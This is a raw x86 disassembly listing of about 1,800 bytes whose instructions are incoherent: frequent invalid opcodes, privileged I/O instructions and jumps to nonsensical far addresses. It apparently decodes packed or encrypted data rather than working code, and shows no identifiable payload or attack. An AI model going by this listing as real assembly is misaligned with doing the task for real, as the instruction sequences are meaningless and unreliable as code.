  41aa74:	push   0xffffff86
  41aa76:	push   esi
  41aa77:	pop    edi
  41aa78:	icebp  
  41aa79:	mov    WORD PTR [esi],?
  41aa7b:	mov    ecx,0xe4e7c3de
  41aa80:	jnp    0x41aad3
  41aa82:	mov    edi,edi
  41aa84:	aas    
  41aa85:	jbe    0x41aae4
  41aa87:	fnstsw WORD PTR [ebp-0xc]
  41aa8a:	and    DWORD PTR [edi],esp
  41aa8c:	inc    eax
  41aa8d:	ds mov dh,0xab
  41aa90:	into   
  41aa91:	cdq    
  41aa92:	gs jl  0x41aa55
  41aa95:	pop    esp
  41aa96:	dec    edi
  41aa97:	and    ah,BYTE PTR [edx]
  41aa99:	xor    DWORD PTR [eax-0x7d],edx
  41aa9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa9d:	ins    DWORD PTR es:[edi],dx
  41aa9e:	ret    0x610
  41aaa1:	in     al,0x68
  41aaa3:	push   0x69
  41aaa5:	adc    eax,0xf8ebd8ea
  41aaaa:	lods   al,BYTE PTR ds:[esi]
  41aaab:	adc    BYTE PTR [esi-0x5c],cl
  41aaae:	gs test al,0x68
  41aab1:	xchg   DWORD PTR [ecx-0x24],eax
  41aab4:	dec    esi
  41aab5:	jg     0x41aac7
  41aab7:	pop    ebp
  41aab8:	or     eax,0x24e3df4b
  41aabd:	(bad)  
  41aabe:	xor    al,0x57
  41aac0:	and    eax,0x26b2a534
  41aac5:	dec    edi
  41aac6:	sbb    ebp,esp
  41aac8:	shl    bl,0xe
  41aacb:	lahf   
  41aacc:	iret   
  41aacd:	mov    edx,0x43fd91ca
  41aad2:	xor    BYTE PTR [ebx-0x688252b6],dh
  41aad8:	jl     0x41ab32
  41aada:	push   edx
  41aadb:	fidivr WORD PTR [esi]
  41aadd:	mov    al,0xb3
  41aadf:	outs   dx,BYTE PTR ds:[esi]
  41aae0:	mov    edi,0x7c48d45f
  41aae5:	imul   edx,DWORD PTR [edx+0x35d0cee4],0x52caf822
  41aaef:	mov    BYTE PTR [edi],ah
  41aaf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaf2:	scas   eax,DWORD PTR es:[edi]
  41aaf3:	mov    ebx,0xb33816b
  41aaf8:	mov    ah,0x77
  41aafa:	cmp    edx,eax
  41aafc:	ins    BYTE PTR es:[edi],dx
  41aafd:	sbb    ch,al
  41aaff:	xchg   ecx,eax
  41ab00:	pop    eax
  41ab01:	jmp    0x1fdf:0xe9b4ad14
  41ab08:	dec    eax
  41ab09:	jge    0x41ab72
  41ab0b:	ds and al,0x9f
  41ab0e:	call   0xa41851b9
  41ab13:	or     BYTE PTR [eax],0x98
  41ab16:	jmp    0xe656cb48
  41ab1b:	dec    esp
  41ab1c:	mov    bh,0x8b
  41ab1e:	(bad)
  41ab21:	and    DWORD PTR gs:[ebx],0xfffffff3
  41ab25:	mov    edx,DWORD PTR [esp+edx*8]
  41ab28:	out    dx,eax
  41ab29:	out    0x65,eax
  41ab2b:	xor    BYTE PTR [edx-0x30e9cdca],dl
  41ab31:	inc    ecx
  41ab32:	fild   WORD PTR [edi]
  41ab34:	mov    dl,0x80
  41ab36:	sub    ecx,ecx
  41ab38:	dec    ecx
  41ab39:	jg     0x41ab5c
  41ab3b:	pop    edx
  41ab3c:	lahf   
  41ab3d:	xor    eax,0x6aca1e78
  41ab42:	repz mov ebx,esi
  41ab45:	sub    bl,ch
  41ab47:	or     al,0xe
  41ab49:	call   0xd9338d14
  41ab4e:	clc    
  41ab4f:	stos   BYTE PTR es:[edi],al
  41ab50:	xor    ebp,ecx
  41ab52:	lods   eax,DWORD PTR ds:[esi]
  41ab53:	sub    BYTE PTR [ecx+esi*1],bl
  41ab56:	fs jmp 0x41ab9d
  41ab59:	lds    ebx,FWORD PTR [ebp-0x73]
  41ab5c:	push   0x59
  41ab5e:	(bad)  
  41ab5f:	push   0x46
  41ab61:	adc    esi,esp
  41ab63:	mov    esi,0x632961e8
  41ab68:	sub    bh,bh
  41ab6a:	lea    edx,[esi]
  41ab6c:	data16 das 
  41ab6e:	arpl   cx,ax
  41ab70:	jne    0x41ab88
  41ab72:	outs   dx,BYTE PTR ds:[esi]
  41ab73:	adc    eax,0x9f632c89
  41ab78:	jl     0x41ab11
  41ab7a:	dec    edi
  41ab7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab7d:	mov    ebx,0xaa8f7e41
  41ab82:	pop    ecx
  41ab83:	pop    edx
  41ab84:	rol    esp,1
  41ab86:	fdiv   st(1),st
  41ab88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab89:	push   es
  41ab8a:	xchg   ebx,eax
  41ab8b:	push   ss
  41ab8c:	xchg   ebx,eax
  41ab8d:	(bad)  
  41ab8e:	shl    BYTE PTR [ebp-0x4ae5e270],cl
  41ab94:	jp     0x41ab55
  41ab96:	sub    edi,ebx
  41ab98:	mov    al,ds:0x55a3e263
  41ab9d:	int3   
  41ab9e:	xchg   edx,eax
  41ab9f:	lds    ebx,FWORD PTR [edx]
  41aba1:	jl     0x41abde
  41aba3:	in     eax,0x57
  41aba5:	xor    edi,0x2e
  41aba8:	(bad)  
  41aba9:	and    ebp,edx
  41abab:	jns    0x41ac17
  41abad:	add    bl,BYTE PTR ds:[ecx]
  41abb0:	mov    bh,0xe7
  41abb2:	(bad)  
  41abb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb5:	dec    esi
  41abb6:	mov    dl,BYTE PTR [ebp-0x50]
  41abb9:	clc    
  41abba:	jne    0x41ac1b
  41abbc:	push   edx
  41abbd:	push   esi
  41abbe:	retf   
  41abbf:	push   ebx
  41abc0:	(bad)  
  41abc2:	mov    cl,0xa4
  41abc4:	jl     0x41ac2d
  41abc6:	mov    cl,0x12
  41abc8:	push   ds
  41abc9:	(bad)  
  41abca:	shl    edi,0x7e
  41abcd:	lock bound eax,QWORD PTR [ebx]
  41abd0:	cli    
  41abd1:	jle    0x41abc0
  41abd3:	stos   BYTE PTR es:[edi],al
  41abd4:	xchg   DWORD PTR [eax-0x8d4d31f],ebp
  41abda:	xchg   ebp,eax
  41abdb:	sbb    eax,0x643dd746
  41abe0:	or     ebp,esp
  41abe2:	fbld   TBYTE PTR [ecx+edi*8+0x7e]
  41abe6:	in     al,dx
  41abe7:	arpl   WORD PTR [ebp+0x41],sp
  41abea:	mov    edi,0x3ca222cf
  41abef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf0:	push   ebx
  41abf1:	cmp    ecx,esi
  41abf3:	outs   dx,BYTE PTR ds:[esi]
  41abf4:	jnp    0x41abcb
  41abf6:	or     al,0x2
  41abf8:	or     eax,0xf9ed0cc1
  41abfd:	inc    esi
  41abfe:	or     eax,0x6a9a7cf3
  41ac03:	pop    eax
  41ac04:	or     ebp,esi
  41ac06:	hlt    
  41ac07:	stos   BYTE PTR es:[edi],al
  41ac08:	les    ebp,FWORD PTR [esi]
  41ac0a:	xchg   eax,esp
  41ac0c:	or     BYTE PTR [eax-0x53],0x3b
  41ac10:	mov    ds:0x77478d70,eax
  41ac15:	cld    
  41ac16:	add    bl,BYTE PTR [edx+0x15af6244]
  41ac1c:	push   ss
  41ac1d:	test   al,0xdf
  41ac1f:	pusha  
  41ac20:	mov    edi,0x60eb9154
  41ac25:	adc    BYTE PTR [edi-0x6e],0xbb
  41ac29:	adc    ecx,DWORD PTR [esi+0x79]
  41ac2c:	dec    ebx
  41ac2d:	fnstsw WORD PTR [ebx+0x28]
  41ac30:	cmp    eax,0xe318fc7
  41ac35:	push   ds
  41ac36:	(bad)  
  41ac38:	push   esp
  41ac39:	jge    0x41ac16
  41ac3b:	in     al,0x91
  41ac3d:	push   esp
  41ac3e:	xor    DWORD PTR [bp+si-0x6e2c],esi
  41ac43:	jmp    0xc4bc:0x11872508
  41ac4a:	sub    eax,0xc3c538b
  41ac4f:	push   eax
  41ac50:	push   0xa54dcc3
  41ac55:	cmp    al,BYTE PTR [esi]
  41ac57:	(bad)  
  41ac58:	(bad)  
  41ac59:	sbb    edx,DWORD PTR [edx+edi*1]
  41ac5c:	fiadd  WORD PTR [ecx+ebp*1+0x4ba16783]
  41ac63:	out    dx,al
  41ac64:	mov    dl,ah
  41ac66:	and    ecx,0x44
  41ac69:	leave  
  41ac6a:	add    DWORD PTR [edx-0x24],ebx
  41ac6d:	int3   
  41ac6e:	or     DWORD PTR [ebx-0x3f],esp
  41ac71:	sbb    cl,dh
  41ac73:	cli    
  41ac74:	das    
  41ac75:	jecxz  0x41ac3e
  41ac77:	jmp    0x41acb9
  41ac79:	mov    al,ds:0xd9f677c
  41ac7e:	pop    ds
  41ac7f:	add    DWORD PTR [ecx+0x39],ecx
  41ac82:	or     al,0x3e
  41ac84:	inc    ecx
  41ac85:	stc    
  41ac86:	in     al,dx
  41ac87:	and    eax,0x1f9b74f7
  41ac8c:	mov    al,ds:0x8ccff299
  41ac91:	xchg   ecx,eax
  41ac92:	and    BYTE PTR [ecx],dl
  41ac94:	push   0xffffff8e
  41ac96:	mov    ebx,0x1c6d6273
  41ac9b:	mov    ds:0xab44e508,al
  41aca0:	inc    edx
  41aca1:	jo     0x41acd1
  41aca3:	inc    ecx
  41aca4:	fbld   TBYTE PTR [edi+edx*2-0x13c286be]
  41acab:	inc    esp
  41acac:	inc    ebx
  41acad:	inc    edi
  41acae:	retf   0x3c64
  41acb1:	stos   BYTE PTR es:[edi],al
  41acb2:	dec    ebx
  41acb3:	xor    eax,0xd927de7b
  41acb8:	sub    dh,BYTE PTR [eax]
  41acba:	lods   eax,DWORD PTR ds:[esi]
  41acbb:	pop    edi
  41acbc:	outs   dx,DWORD PTR ds:[esi]
  41acbd:	mov    esi,0xf7a7ab55
  41acc2:	or     ebx,DWORD PTR [edi-0xff1651f]
  41acc8:	rcr    BYTE PTR [edi+0x6995f4cb],cl
  41acce:	cmp    ch,al
  41acd0:	sbb    eax,0x34a2a071
  41acd5:	add    eax,0xb31bd0a7
  41acda:	xor    al,0xd8
  41acdc:	mov    dl,0x40
  41acde:	adc    esi,ebp
  41ace0:	retf   
  41ace1:	loope  0x41ac99
  41ace3:	lock jnp 0x41aca8
  41ace6:	fwait
  41ace7:	xlat   BYTE PTR ds:[ebx]
  41ace8:	lea    esi,[eax-0x63]
  41aceb:	(bad)  
  41acec:	fnstcw WORD PTR [ebp+0x5d]
  41acef:	pop    ss
  41acf0:	sahf   
  41acf1:	dec    esp
  41acf2:	in     al,0x15
  41acf4:	je     0x41ad23
  41acf6:	xchg   edi,eax
  41acf7:	stos   BYTE PTR es:[edi],al
  41acf8:	sub    al,0x1a
  41acfa:	neg    DWORD PTR [esi-0xd]
  41acfd:	mov    eax,0xe1e806ed
  41ad02:	push   esi
  41ad03:	shr    ecx,0x22
  41ad06:	jg     0x41acfa
  41ad08:	jno    0x41acb0
  41ad0a:	inc    edi
  41ad0b:	dec    ecx
  41ad0c:	test   DWORD PTR [ebp-0x7d],0xbf4480f
  41ad13:	xchg   ebp,eax
  41ad14:	in     eax,dx
  41ad15:	test   eax,0xa6e24298
  41ad1a:	cdq    
  41ad1b:	mov    esp,0x2d15a5ae
  41ad20:	jnp    0x41ad1f
  41ad22:	xchg   ebx,eax
  41ad23:	sub    edx,DWORD PTR [bp+si+0x6f]
  41ad27:	cmp    BYTE PTR [esi+esi*2+0x69617c26],bh
  41ad2e:	push   edi
  41ad2f:	mov    ds:0xdca4ec78,eax
  41ad34:	cli    
  41ad35:	push   esp
  41ad36:	(bad)  
  41ad37:	xchg   edx,eax
  41ad38:	jns    0x41adab
  41ad3a:	jns    0x41ad34
  41ad3c:	pusha  
  41ad3d:	fidivr DWORD PTR ds:0x6aac289f
  41ad43:	sbb    eax,0x82478745
  41ad48:	inc    eax
  41ad49:	mov    bl,0xb5
  41ad4b:	cli    
  41ad4c:	adc    eax,0x748c5a80
  41ad51:	mov    eax,ds:0xb4fbe7c0
  41ad56:	stos   DWORD PTR es:[edi],eax
  41ad57:	sub    al,0x26
  41ad59:	hlt    
  41ad5a:	cmp    dh,bh
  41ad5c:	clc    
  41ad5d:	sar    BYTE PTR [ebx+0x75],cl
  41ad60:	mov    al,0x40
  41ad62:	enter  0xf80a,0xbd
  41ad66:	push   es
  41ad67:	push   es
  41ad68:	fnsave ds:0x843400d3
  41ad6e:	cwde   
  41ad6f:	int3   
  41ad70:	mov    cl,0xe
  41ad72:	pop    ss
  41ad73:	sbb    bh,ah
  41ad75:	jmp    0x559532d5
  41ad7a:	iret   
  41ad7b:	sub    al,0x71
  41ad7d:	mov    dh,0x5d
  41ad7f:	pop    eax
  41ad80:	sub    DWORD PTR ds:0x16a47116,esi
  41ad86:	xchg   esp,eax
  41ad87:	mov    cs,WORD PTR [ecx-0x5b737a8c]
  41ad8d:	xchg   ebx,eax
  41ad8e:	inc    eax
  41ad8f:	les    edx,FWORD PTR [edx+0xbac81fa]
  41ad95:	jnp    0x41ad37
  41ad97:	xlat   BYTE PTR ds:[ebx]
  41ad98:	or     al,0xfe
  41ad9a:	pop    ss
  41ad9b:	inc    ebp
  41ad9c:	xchg   esp,eax
  41ad9d:	push   0x70
  41ad9f:	ror    DWORD PTR [ecx],cl
  41ada1:	mov    bl,0x2b
  41ada3:	jb     0x41ae09
  41ada5:	xlat   BYTE PTR ds:[ebx]
  41ada6:	pushf  
  41ada7:	or     DWORD PTR [edx+0x16d3de69],ecx
  41adad:	je     0x41add6
  41adaf:	call   0x11227548
  41adb4:	xor    bh,BYTE PTR [edx-0x25]
  41adb7:	adc    al,0x68
  41adb9:	or     ebx,ecx
  41adbb:	xchg   DWORD PTR [ebx+0xc],ebx
  41adbe:	jg     0x41ad77
  41adc0:	sbb    al,BYTE PTR [ebp-0x48]
  41adc3:	in     al,0x9b
  41adc5:	sbb    BYTE PTR [edx-0x17],ch
  41adc8:	scas   eax,DWORD PTR es:[edi]
  41adc9:	add    DWORD PTR [esi-0x1f1df573],0xafbac1
  41add3:	jmp    0x3f65c344
  41add8:	jge    0x41ada3
  41adda:	inc    ebp
  41addb:	pop    ecx
  41addc:	popf   
  41addd:	push   ebp
  41adde:	xchg   esi,eax
  41addf:	inc    ebx
  41ade0:	dec    ebp
  41ade1:	cmp    eax,DWORD PTR [esi]
  41ade3:	push   cs
  41ade4:	sbb    eax,0xf537fe7
  41ade9:	gs sbb al,0xdb
  41adec:	cmp    eax,0xaa7de2b6
  41adf1:	fdivp  st(0),st
  41adf3:	ins    BYTE PTR es:[edi],dx
  41adf4:	or     ah,BYTE PTR [ebx]
  41adf6:	mov    esi,0x2af3041d
  41adfb:	stos   DWORD PTR es:[edi],eax
  41adfc:	retf   0x443
  41adff:	fstp   DWORD PTR [esp+ebp*4-0x1d]
  41ae03:	jb     0x41ae69
  41ae05:	inc    dx
  41ae07:	pop    eax
  41ae08:	mov    dh,0xf
  41ae0a:	jns    0x41ae47
  41ae0c:	test   DWORD PTR [esi-0x2f],esi
  41ae0f:	fnsave [ecx+0x4a11d6c]
  41ae15:	rcl    ecx,0x23
  41ae18:	push   ecx
  41ae19:	xor    eax,0x9759e7d5
  41ae1e:	test   BYTE PTR [esi+0x5c114738],0x3e
  41ae25:	mov    al,ds:0x3ed32de2
  41ae2a:	js     0x41ae15
  41ae2c:	mov    al,ds:0x8928c85
  41ae31:	leave  
  41ae32:	jbe    0x41ae43
  41ae34:	(bad)  
  41ae35:	adc    eax,0x9a4c7b24
  41ae3a:	xchg   ecx,eax
  41ae3b:	out    0xc8,eax
  41ae3d:	(bad)  [edx-0x28]
  41ae40:	sub    ch,BYTE PTR [esi]
  41ae42:	push   esp
  41ae43:	lods   al,BYTE PTR ds:[esi]
  41ae44:	or     esi,esi
  41ae46:	out    0x71,eax
  41ae48:	cwde   
  41ae49:	mov    dh,0x3e
  41ae4b:	(bad)  
  41ae4c:	sti    
  41ae4d:	or     DWORD PTR [edx+0x46],edx
  41ae50:	push   0xadb8c5b9
  41ae55:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41ae57:	mov    ds:0x8a956278,eax
  41ae5c:	enter  0xb70,0xd0
  41ae60:	(bad)  
  41ae61:	fist   DWORD PTR [esi]
  41ae63:	pop    esp
  41ae64:	or     dh,dh
  41ae66:	hlt    
  41ae67:	pop    ebp
  41ae68:	stc    
  41ae69:	cmc    
  41ae6a:	xchg   ebp,eax
  41ae6b:	retf   
  41ae6c:	loopne 0x41ae57
  41ae6e:	jns    0x41aeec
  41ae70:	xchg   ebp,eax
  41ae71:	imul   ebp,DWORD PTR [ecx-0x1d],0xfffffff7
  41ae75:	jbe    0x41ae15
  41ae77:	cmp    al,0xff
  41ae79:	addr16 sub al,0x1
  41ae7c:	jo     0x41ae0b
  41ae7e:	sub    eax,0x39d015f8
  41ae83:	dec    ecx
  41ae84:	pop    ebp
  41ae85:	mov    WORD PTR [edx+0x10],ss
  41ae88:	push   0x5dabbf4a
  41ae8d:	int3   
  41ae8e:	dec    esi
  41ae8f:	and    bh,BYTE PTR [edi+0x7d6f66dc]
  41ae95:	push   edi
  41ae96:	xchg   DWORD PTR [edx+0x5],edx
  41ae99:	push   edi
  41ae9a:	aaa    
  41ae9b:	and    ebx,DWORD PTR [ebp+0x69c4140b]
  41aea1:	sub    DWORD PTR [ebx+0x4e3ce0b4],eax
  41aea7:	push   ds
  41aea8:	adc    DWORD PTR [esi+0x5c],0xffffffe9
  41aeac:	jp     0x41ae35
  41aeae:	push   edi
  41aeaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb0:	adc    al,0xdc
  41aeb2:	les    esp,FWORD PTR [eax+0x5d]
  41aeb5:	pop    ds
  41aeb6:	mov    edi,0x69bb5d03
  41aebb:	pmulhuw mm0,QWORD PTR [edi+0x65]
  41aebf:	adc    DWORD PTR [edx],edi
  41aec1:	jns    0x41af17
  41aec3:	mov    bh,0x5e
  41aec5:	mov    dh,al
  41aec7:	shr    BYTE PTR [edx-0x2fdf30a0],0x6c
  41aece:	fs icebp 
  41aed0:	dec    edx
  41aed1:	cli    
  41aed2:	add    al,BYTE PTR ds:[edi]
  41aed5:	mov    ch,0x7b
  41aed7:	push   ecx
  41aed8:	(bad)  
  41aed9:	cdq    
  41aeda:	shr    DWORD PTR [eax-0x75ef705],cl
  41aee0:	pop    eax
  41aee1:	scas   al,BYTE PTR es:[edi]
  41aee2:	daa    
  41aee3:	outs   dx,DWORD PTR ds:[esi]
  41aee4:	iret   
  41aee5:	es mul esp
  41aee8:	test   al,0x41
  41aeea:	call   0xd0362dbb
  41aeef:	dec    ebp
  41aef0:	es xchg ecx,eax
  41aef2:	pop    ecx
  41aef3:	call   0x3619:0x354bf73f
  41aefa:	push   esp
  41aefb:	pushf  
  41aefc:	sbb    eax,0xbf0a9957
  41af01:	aaa    
  41af02:	inc    edx
  41af03:	xchg   edi,eax
  41af04:	and    eax,DWORD PTR [edi+0x59]
  41af07:	mov    ch,0x59
  41af09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af0a:	stos   BYTE PTR es:[edi],al
  41af0b:	and    BYTE PTR [ebp+0x51],dl
  41af0e:	ins    DWORD PTR es:[edi],dx
  41af0f:	ror    BYTE PTR [edx+0x3a0d9e26],1
  41af15:	adc    edx,DWORD PTR [esi]
  41af17:	cmp    ah,dl
  41af19:	adc    DWORD PTR [ecx+0x4d54bb6],ecx
  41af1f:	xchg   ebx,eax
  41af20:	aam    0x6d
  41af22:	xchg   edx,eax
  41af23:	iret   
  41af24:	(bad)  
  41af25:	xor    al,0xef
  41af27:	(bad)  
  41af28:	lods   eax,DWORD PTR ds:[esi]
  41af29:	test   BYTE PTR [ebx-0x50feb966],0xa5
  41af30:	imul   esi,DWORD PTR [ebx+ecx*4],0x41
  41af34:	adc    DWORD PTR [ebp-0x5adc59b2],edx
  41af3a:	jo     0x41af51
  41af3c:	test   eax,0x772d30a
  41af41:	pushf  
  41af42:	mov    edi,0x4ef643c2
  41af47:	loop   0x41af00
  41af49:	int3   
  41af4a:	(bad)  
  41af4b:	sbb    al,0x1d
  41af4d:	loope  0x41afc3
  41af4f:	ds inc esp
  41af51:	clc    
  41af52:	pop    esp
  41af53:	js     0x41af70
  41af55:	lahf   
  41af56:	sar    DWORD PTR [ebx],0xb7
  41af59:	test   BYTE PTR [eax+0x27c86467],dh
  41af5f:	mul    BYTE PTR ds:[esp+ebx*1+0x64]
  41af64:	(bad)  
  41af65:	inc    esp
  41af66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af67:	push   ecx
  41af68:	mov    ds,WORD PTR ds:0x2d62cbaa
  41af6e:	or     BYTE PTR [ecx],cl
  41af70:	stos   BYTE PTR es:[edi],al
  41af71:	(bad)  
  41af72:	adc    DWORD PTR [esi+0x63],esp
  41af75:	inc    BYTE PTR [ecx+0x44c8c888]
  41af7b:	xchg   esi,eax
  41af7c:	std    
  41af7d:	xlat   BYTE PTR ds:[ebx]
  41af7e:	sub    eax,0x39efdb40
  41af83:	out    0x4b,al
  41af85:	mov    ds:0xebdc73e3,al
  41af8a:	repz mov bl,0xc7
  41af8d:	sub    ecx,DWORD PTR [ecx]
  41af8f:	in     al,dx
  41af90:	push   eax
  41af91:	or     bl,BYTE PTR [ecx-0x2bdbc786]
  41af97:	pushf  
  41af98:	je     0x41afc6
  41af9a:	mov    dl,0x43
  41af9c:	inc    edx
  41af9d:	mov    al,ds:0x9b9f67a7
  41afa2:	add    edx,esi
  41afa4:	adc    BYTE PTR [esi+0x1abab99c],bh
  41afaa:	jl     0x41aff3
  41afac:	adc    ebx,DWORD PTR [esi-0x617ed756]
  41afb2:	xor    ah,BYTE PTR [edi]
  41afb4:	jae    0x41af77
  41afb6:	cmp    ah,al
  41afb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb9:	mov    eax,ds:0x128b5c6
  41afbe:	imul   edi,DWORD PTR [esi+0x40],0xdb4c4245
  41afc5:	ins    DWORD PTR es:[edi],dx
  41afc6:	mov    ebp,0xb6a58083
  41afcb:	mov    ch,0xf8
  41afcd:	add    esi,DWORD PTR [ebx-0x28]
  41afd0:	int3   
  41afd1:	pop    ds
  41afd2:	imul   esi,DWORD PTR [edi],0xb6325314
  41afd8:	cmp    DWORD PTR [ebp-0x33],0xffffffcf
  41afdc:	push   esp
  41afdd:	inc    ebx
  41afde:	sbb    edi,DWORD PTR [edx+0x48]
  41afe1:	arpl   WORD PTR [edi+0x119afc46],si
  41afe7:	out    0xc,al
  41afe9:	inc    edx
  41afea:	jbe    0x41b046
  41afec:	cs push es
  41afee:	mov    BYTE PTR [eax+ecx*4],bh
  41aff1:	fs jnp 0x41af7c
  41aff4:	in     eax,0xcc
  41aff6:	xchg   esp,eax
  41aff7:	test   al,0x9e
  41aff9:	loope  0x41af7e
  41affb:	sbb    DWORD PTR [ebp+0x3f],ebp
  41affe:	sub    edi,eax
  41b000:	inc    edx
  41b001:	jmp    0x41afab
  41b003:	mov    eax,ds:0x3ea32eef
  41b008:	sub    dh,dh
  41b00a:	test   al,0xd2
  41b00c:	cmp    al,0x7b
  41b00e:	gs cdq 
  41b010:	or     BYTE PTR [edx-0x5a],0xf5
  41b014:	fidivr DWORD PTR [ecx+esi*1]
  41b017:	cmp    al,0x77
  41b019:	mov    ecx,edi
  41b01b:	mov    esp,0x327d7330
  41b020:	stos   BYTE PTR es:[edi],al
  41b021:	stos   DWORD PTR es:[edi],eax
  41b022:	scas   eax,DWORD PTR es:[edi]
  41b023:	sub    al,0x40
  41b025:	pop    ds
  41b026:	inc    ecx
  41b027:	jge    0x41b078
  41b029:	xchg   ecx,eax
  41b02a:	jae    0x41b07c
  41b02c:	jno    0x41aff3
  41b02e:	stc    
  41b02f:	pop    ebp
  41b030:	arpl   bx,cx
  41b032:	sub    DWORD PTR ds:0xcc9e0546,eax
  41b038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b039:	nop
  41b03a:	xchg   esi,eax
  41b03b:	add    eax,0xe8fbd0d7
  41b040:	lea    eax,[ebx-0x2ba9bf1c]
  41b046:	jl     0x41b0a3
  41b048:	cmp    al,0x6
  41b04a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b04b:	inc    eax
  41b04c:	pop    ebx
  41b04d:	cmpps  xmm5,XMMWORD PTR [ecx+0x11ddf3a3],0xc5
  41b055:	pop    ebp
  41b056:	xor    ch,BYTE PTR [edi]
  41b058:	and    BYTE PTR [edi+eax*1+0x77ffa82],bh
  41b05f:	jl     0x41b0d0
  41b061:	ret    0x75c0
  41b064:	xchg   BYTE PTR [ecx+0x8cca48a],bl
  41b06a:	jmp    0x5262fbf7
  41b06f:	lods   eax,DWORD PTR ds:[esi]
  41b070:	mov    al,ds:0x7a7af918
  41b075:	jo     0x41b0e0
  41b077:	add    dl,ah
  41b079:	int3   
  41b07a:	jle    0x41b05e
  41b07c:	and    eax,0x353814ab
  41b081:	stc    
  41b082:	pop    edi
  41b083:	pop    edi
  41b084:	(bad)  
  41b085:	neg    DWORD PTR ds:0x16b6d527
  41b08b:	aaa    
  41b08c:	(bad)  
  41b08e:	sub    BYTE PTR [edi-0x3f],dh
  41b091:	and    eax,0x789ab96f
  41b096:	iret   
  41b097:	push   eax
  41b098:	fnstsw WORD PTR [eax-0x29]
  41b09b:	mov    WORD PTR [eax+0x11],di
  41b09f:	mov    dh,0x11
  41b0a1:	(bad)  
  41b0a2:	out    dx,eax
  41b0a3:	adc    eax,edx
  41b0a5:	or     eax,0x205f1bc2
  41b0aa:	pop    edx
  41b0ab:	sbb    BYTE PTR [edx+0x6fac5466],ah
  41b0b1:	int3   
  41b0b2:	sbb    DWORD PTR [edx-0xdcca353],eax
  41b0b8:	inc    ebp
  41b0b9:	outs   dx,DWORD PTR ds:[esi]
  41b0ba:	outs   dx,DWORD PTR ds:[esi]
  41b0bb:	xor    BYTE PTR [edi+0x7e],cl
  41b0be:	pop    ebx
  41b0bf:	sbb    BYTE PTR [ebp-0x57],cl
  41b0c2:	xchg   ebx,eax
  41b0c3:	das    
  41b0c4:	pop    esp
  41b0c5:	pushf  
  41b0c6:	call   0x9a5c:0x5bb6a9e5
  41b0cd:	inc    esi
  41b0ce:	ds mov ah,0x94
  41b0d1:	jmp    0x38ce:0xd7f0e944
  41b0d8:	repnz cmp DWORD PTR ds:0x8b5a3951,esp
  41b0df:	cmp    eax,0x98aeb833
  41b0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0e5:	fisub  WORD PTR [esi]
  41b0e7:	ins    BYTE PTR es:[edi],dx
  41b0e8:	cmp    ebx,DWORD PTR [ebp-0x4b]
  41b0eb:	push   ebp
  41b0ec:	mov    dh,0x98
  41b0ee:	popf   
  41b0ef:	es push ds
  41b0f1:	mov    BYTE PTR [ebp-0x69a1fe2d],dh
  41b0f7:	xchg   BYTE PTR [esi],bl
  41b0f9:	pop    eax
  41b0fa:	jns    0x41b0e9
  41b0fc:	jmp    0xf562:0x97da365f
  41b103:	std    
  41b104:	(bad)  
  41b105:	jnp    0x41b167
  41b107:	lods   al,BYTE PTR ds:[esi]
  41b108:	sub    eax,0x5b669d1a
  41b10d:	jnp    0x41b155
  41b10f:	pop    ds
  41b110:	ret    0x96ea
  41b113:	ret    
  41b114:	jmp    DWORD PTR [eax+0x15b520c8]
  41b11a:	fstp   DWORD PTR [edi+ecx*8]
  41b11d:	mov    ?,WORD PTR [eax-0x3f]
  41b120:	fucomip st,st(5)
  41b122:	add    BYTE PTR [edi],dl
  41b124:	sbb    eax,0x665da3d4
  41b129:	fdivrp st(1),st
  41b12b:	fcom   st(2)
  41b12d:	mov    WORD PTR [eax+0x6d263094],ss
  41b133:	outs   dx,BYTE PTR ds:[esi]
  41b134:	fbstp  TBYTE PTR [esi+0x3705cbda]
  41b13a:	xchg   edx,eax
  41b13b:	mov    cl,0xb4
  41b13d:	(bad)  
  41b13f:	jmp    0x41b1a3
  41b141:	(bad)  
  41b142:	mov    eax,ds:0x811c09bc
  41b147:	je     0x41b0fa
  41b149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b14a:	pop    es
  41b14b:	mov    ebp,0xf114b2cd
  41b150:	data16 xor al,0x7c
  41b153:	ins    BYTE PTR es:[edi],dx
  41b154:	call   0xd045:0x5c91d901
  41b15b:	ds lahf 
  41b15d:	adc    ch,cl
  41b15f:	test   eax,0x481468d3
  41b164:	jo     0x41b14f
  41b166:	push   cs
  41b167:	fs imul ebp,esp,0x29
  41b16b:	and    eax,0xb2c04f31
  41b170:	imul   ebx,DWORD PTR [edx+0x65],0xdada3db9
  41b177:	add    BYTE PTR gs:[edi+0x20],0xfb
  41b17c:	push   ebp
  41b17d:	push   es
  41b17e:	push   ebx
  41b17f:	dec    ebx
  41b180:	and    al,0xe5
  41b182:	jg     0x41b10a
  41b184:	repz xchg edx,eax
  41b186:	add    edx,DWORD PTR [esi+0x1d8e69d3]
  41b18c:	xchg   ecx,eax
  41b18d:	adc    al,0x21
  41b18f:	in     eax,dx
  41b190:	std    
  41b191:	sbb    BYTE PTR [ebx+0x59da01ac],0x54
  41b198:	int    0x0
  41b19a:	push   ds
  41b19b:	fisub  DWORD PTR [ebx]
  41b19d:	(bad)  
  41b19e:	dec    esp
  41b19f:	pop    ebx
  41b1a0:	cmp    edi,DWORD PTR [esi]
  41b1a2:	or     al,0x13
  41b1a4:	pop    ebp
  41b1a5:	std    
  41b1a6:	or     al,0x9b
  41b1a8:	mov    edi,0x6870564c
  41b1ad:	and    BYTE PTR [edi-0x4c02c018],cl
  41b1b3:	stc    
  41b1b4:	clc    
  41b1b5:	pop    edx
